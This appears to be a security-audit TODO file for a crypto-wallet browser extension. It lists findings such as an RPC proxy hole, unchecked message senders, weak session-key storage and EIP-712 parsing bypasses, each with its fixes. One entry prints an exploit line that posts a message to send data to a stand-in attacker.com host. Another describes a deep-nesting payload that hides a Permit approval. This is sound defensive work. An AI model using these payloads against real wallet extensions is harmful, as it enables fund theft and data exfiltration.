# Security Fixes TODO

Findings from a comprehensive security audit of the extension's injected scripts, message handlers, and key storage (2026-04-08).

---

## CRITICAL

### 1. RPC URL Proxy (Cross-Origin Fetch via Extension)

- **Status:** [x] DONE
- **Files:** `inject.ts:542-574` -> `background.ts:1648-1654` -> `background.ts:192-234`
- **Issue:** Any page can post `i_rpcRequest` with an arbitrary `rpcUrl`. The content script (`inject.ts`) forwards it blindly to the background, which calls `fetch(rpcUrl, ...)` with only an `http://`/`https://` protocol check. This turns the extension into a cross-origin JSON POST proxy for any website.
- **Exploit:**
  ```js
  window.postMessage({
    type: "i_rpcRequest",
    msg: { id: "x", rpcUrl: "https://attacker.com/collect", method: "eth_call", params: [] }
  }, "*")
  ```
- **Fix:** Don't forward `rpcUrl` from the page. The content script already has `networksInfo` — resolve the RPC URL from the current chain's config. Alternatively, maintain an allowlist of known RPC URLs in the background and reject anything else.

---

## HIGH

### 2. Missing `isExtensionPage()` on Confirmation / Mutation Handlers

- **Status:** [x] DONE
- **File:** `background.ts`
- **Issue:** Only 5 of ~110 message types check `isExtensionPage(sender)`. The following handlers accept messages from any content script (and thus any web page via the inject bridge) without verifying the sender is an extension page:

  | Handler | Risk |
  |---|---|
  | `confirmTransaction` | Approve pending tx without popup |
  | `confirmBatchTransactionAsync` | Approve pending batch tx |
  | `confirmSignatureRequest` | Approve pending signature |
  | `confirmAddChain` | Add chain with malicious RPC URL to storage |
  | `confirmWatchAsset` | Add fake token to wallet |
  | `addBankrAccount` | Inject attacker's API key via `setCachedApiKeyDirect` |
  | `addPrivateKeyAccount` | Add attacker-controlled private key |
  | `addSeedPhraseAccount` | Add attacker-controlled seed phrase |
  | `setActiveAccount` | Switch active account |
  | `removeAccount` | Delete user account |
  | `lockWallet` | Force-lock wallet (DoS) |
  | `clearApiKeyCache` | Clear cached credentials (DoS) |
  | `getPendingTxRequests` | Read all pending transaction details |
  | `getPendingBatchTxRequests` | Read all pending batch tx details |
  | `rejectTransaction` | Reject user's pending transactions |
  | `rejectBatchTransaction` | Reject user's pending batch transactions |

- **Current mitigation:** `inject.ts` does not forward these message types from pages — only the `i_*` prefixed types are forwarded. But this is fragile; any future inject.ts change could open the gate.
- **Fix:** Add `isExtensionPage(sender)` checks to ALL confirmation, mutation, and sensitive-read handlers. Messages that are legitimately sent by content scripts on behalf of dapps (like `sendTransaction`, `signatureRequest`, `rpcRequest`) should remain open but should NOT include confirmation actions.

### 3. Session Password Stored With Its Own Decryption Key

- **Status:** [x] DONE
- **File:** `sessionCache.ts:250-265`
- **Issue:** When auto-lock is "Never", the password is encrypted in `chrome.storage.session` using AES-GCM, but the encryption key and IV are stored right alongside the ciphertext in the same storage entry. Any code path that can read `chrome.storage.session` trivially decrypts the password.
- **Fix:** Either derive the session encryption key from something not stored in the same location (e.g., extension instance ID + random entropy kept only in memory), or accept that service worker restarts require re-unlock and drop session password persistence entirely.

---

## MEDIUM

### 4. ~~`wallet_getCallsStatus` Bundle ID Probing~~

- **Status:** [x] NOT AN ISSUE
- **File:** `batchTxHandlers.ts:502-521`
- **Reason:** Bundle IDs are `crypto.randomUUID()` (unguessable). The returned data (txHash, receipts) is publicly queryable onchain anyway. Consistent with ERC-5792 spec behavior and how traditional transactions work.

### 5. ~~Dapp-Provided Gas Values Not Capped~~

- **Status:** [x] NOT AN ISSUE
- **Reason:** Non-custodial wallet — users have full control over their transactions. Gas values are shown in the confirmation UI. Imposing limits would be overstepping; consistent with how MetaMask and other wallets handle this.

### 6. Batch Transaction `to: undefined` Defaults to Zero Address

- **Status:** [x] DONE
- **File:** `batchTxHandlers.ts:78`
- **Issue:** If a batch call has no `to` field, it silently defaults to `0x0000...0000` instead of rejecting the request. This could cause accidental fund loss (sending value to the zero address).
- **Fix:** Reject batch calls where any individual call is missing a `to` address. Return an error to the dapp.

---

## LOW / Hardening

### 7. PBKDF2 Iteration Count at Minimum Threshold

- **Status:** [x] SKIPPED
- **File:** `cryptoUtils.ts:6`
- **Issue:** PBKDF2 iterations = 600,000. Meets OWASP minimum.
- **Reason skipped:** Migration risk for existing users outweighs the marginal security benefit.

### ~~8. Pending Batch Requests Never Actively Cleaned Up~~

- **Status:** [x] SUPERSEDED BY USER-CONTROLLED PROMPTS
- **Current policy:** Pending batch requests deliberately have no age-based
  cleanup. They remain available until the user confirms/rejects them or their
  authorization context is explicitly invalidated. Terminal bundle-status
  maintenance remains separate.

### ~~9. `addEthereumChain` RPC URL Validation~~

- **Status:** [x] NOT AN ISSUE
- **Reason:** If the chain already exists in `networksInfo`, the dapp-provided `rpcUrls` are completely ignored — the wallet uses its own stored RPC URL and returns `null` (per EIP-3085 spec). Dapp-provided URLs only matter for genuinely new chains, which require explicit user approval.

---

## Reported Bugs

### 10. EIP-712 Type Field Nesting Bypass (Permit Parsing)

- **Status:** [x] DONE
- **Files:** `eip712Validator.ts`, `background.ts:534-562`
- **Issue:** A malicious dapp can add deeply nested extra properties (e.g., `fuzz: createDeepNesting(5000)`) to EIP-712 type field definitions alongside the valid `name`/`type` properties. The validator only checked for `name` and `type` existence but didn't strip extra properties. The deeply nested object crashed the UI during stringify/render, causing the signature request to show "No message data" — hiding that it's a Permit granting unlimited token approval.
- **Fix:** The validator now sanitizes type field definitions after validation, stripping all properties except `name` and `type` (the only valid EIP-712 field properties). The entire payload is also checked for max object depth (limit 50) to prevent deeply nested objects anywhere in the payload from crashing the UI. The sanitized typed data is passed to the signature request handler, so the UI always displays the actual permit details.

### 11. EIP-712 Message-Level Sanitization (Display Consistency)

- **Status:** [x] DONE
- **File:** `eip712Validator.ts`
- **Issue:** Extra fields in the `message` object that aren't defined in the `types` schema are displayed to the user but aren't part of the actual EIP-712 signature. This could mislead users into thinking they're signing something different than what actually gets hashed.
- **Fix:** Added `sanitizeValueByType()` which recursively walks the `message` and `domain` objects and only keeps fields defined in the corresponding type definition. The sanitization is part of the validator's output, so both the UI display and the signing path use the same clean data. Recursion is safe because type definitions are already validated for max depth (50) and no circular references.
